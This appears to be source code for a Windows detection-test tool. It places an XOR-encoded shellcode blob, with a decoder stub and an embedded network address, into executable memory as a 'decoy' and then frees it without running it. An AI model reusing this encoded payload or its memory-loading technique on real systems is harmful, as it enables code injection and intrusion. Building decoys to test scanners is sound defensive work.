#include "stdafx.h"
#include "resource.h" 

unsigned char shellcode[] =
"\x90\x90\x90\x90" // header
"\x90\x90\x90\x90\x90\x90\xEB\x11\x5D\x89\xE8\x31\xC9\x66\xB9\x09\x01\x80\x30\x80" // shellcode from test1.asm X 0x00
"\x40\xE2\xFA\xEB\x05\xE8\xEA\xFF\xFF\xFF\xE4\x21\xB0\x80\x80\x80\x0B\xC0\x8C\x0B" // encoded test2.asm X 0x80 starts in this line
"\xF0\x9C\x2D\x0B\xD0\x88\xD5\x01\x45\x65\x80\x80\x80\x0B\xCD\x80\x68\x98\x80\x80"
"\x80\x09\xF5\x80\x01\x45\x84\x80\x80\x80\x01\xFD\x80\x7F\x7F\x7F\x7F\xF5\x66\xDD"
"\x69\xCD\x80\x80\x80\x09\x56\x8F\x37\xDE\xBC\x0B\xF4\x9E\xF8\x0D\xF4\xB2\x9C\x2D"
"\x81\x50\xD0\x2D\x81\x50\xD0\x2D\x81\x50\xDB\xD0\xB1\x40\x0B\xB4\x03\x81\x56\xD3"
"\xD0\xB1\x5B\xB1\x40\x2C\x41\x43\x85\x81\x43\xBD\x80\x80\x80\x80\xF5\x71\x41\x4B"
"\x85\xB9\x4B\xD8\xDB\xF4\x83\xC0\x6B\x5C\xDB\x8F\x37\xB4\xC3\xD8\x0B\xB4\x30\x81"
"\x56\x43\x01\x6C\x94\x7C\x7F\x7F\xE8\x38\x8B\x80\x80\xE8\xA8\x8A\x80\x80\x7F\x15"
"\x6D\x80\x80\x80\xE8\x10\x81\x80\x80\xE8\x84\x90\x80\x80\x7F\x15\x6D\x80\x80\x80"
"\xE8\x50\x87\x80\x80\xE8\xE0\x89\x80\x80\x7F\x15\x6D\x80\x80\x80\xE8\x84\x90\x80"
"\x80\xE8\x10\x81\x80\x80\x7F\x15\x6D\x80\x80\x80\xE8\xE0\x89\x80\x80\xE8\xE4\x80"
"\x80\x80\x7F\x15\x6D\x80\x80\x80\xE8\x7F\x7F\x7F\x7F\x7F\x15\x71\x80\x80\x80\x5C"
"\x5D\x9A\xB3\x10\xD5\x49\x19\x90\x21\xA2\x80\x07\x0F\xC6\x6C\x7F\x7F\x7F\x7F\xE8"
"\xF4\xF4\xF0\xBA\xAF\xAF\xB1\xB0\xAE\xB0\xAE\xB0\xAE\xB5\x80";

PVOID g_ShellcodePtr = NULL;

void LoadShellcode()
{
	SYSTEM_INFO sSysInfo;
	GetSystemInfo(&sSysInfo);

	xprintf(OPLOG_NORMAL, L"> Detected page size %d.\n", sSysInfo.dwPageSize);

	DWORD dwPageSize = sSysInfo.dwPageSize;

	if (sizeof(shellcode) > dwPageSize)
	{
		xprintf(OPLOG_NORMAL, L"! Error, page not large enough to hold shellcode\n");
		return;
	}

	xprintf(OPLOG_NORMAL, L"> Allocating single page RWX\n");

	g_ShellcodePtr = VirtualAlloc(0, dwPageSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	if (NULL != g_ShellcodePtr)
	{
		xprintf(OPLOG_NORMAL, L"# Loading inert shellcode\n");
		memcpy(g_ShellcodePtr, shellcode, sizeof(shellcode));

		xprintf(OPLOG_NORMAL, L"# Inert shellcode loaded. \n");
	}
	else
	{
		xprintf(OPLOG_NORMAL, L"! ERROR: Shellcode memory could not be allocated (0x%08X) \n", GetLastError());
	}
}

void UnloadShellcode()
{
	xprintf(OPLOG_NORMAL, L"# Unloading inert shellcode\n");

	if (NULL != g_ShellcodePtr)
	{
		BOOL bSuccess = VirtualFree(g_ShellcodePtr, 0, MEM_RELEASE);
		if (bSuccess)
		{
			xprintf(OPLOG_NORMAL, L"# Shellcode unloaded. \n");
		}
		else
		{
			xprintf(OPLOG_NORMAL, L"! ERROR: Shellcode could not be unloaded (0x%08X) \n", GetLastError());
		}
	}
	else
	{
		xprintf(OPLOG_NORMAL, L"! ERROR: Shellcode memory not valid. \n");
	}
}

BOOL RunTool()
{
	LoadShellcode();

	Sleep(1000);
	
	xprintf(OPLOG_NORMAL, L"# DECOY IS LIVE - DECOY IS LIVE \n");
	
	if (g_progopts.use_wait_time)
	{
		xprintf(OPLOG_NORMAL, L"# Automatically waiting %d ms... \n", g_progopts.wait_time);
		Sleep(g_progopts.wait_time);
	}
	else
	{
		xprintf(OPLOG_NORMAL, L"# Press any key to close test... \n");
		_getch();
	}
	
	xprintf(OPLOG_NORMAL, L"[ Closing test... ] \n");

	UnloadShellcode();

	xprintf(OPLOG_NORMAL, L"# DECOY REMOVED - TEST CLEAR \n");

	if (g_progopts.use_wait_time)
	{
		xprintf(OPLOG_NORMAL, L"# Automatically continuing... \n");
	}
	else
	{
		xprintf(OPLOG_NORMAL, L"# Press any key to finish... \n");
		_getch();
	}
	
	return true;
}

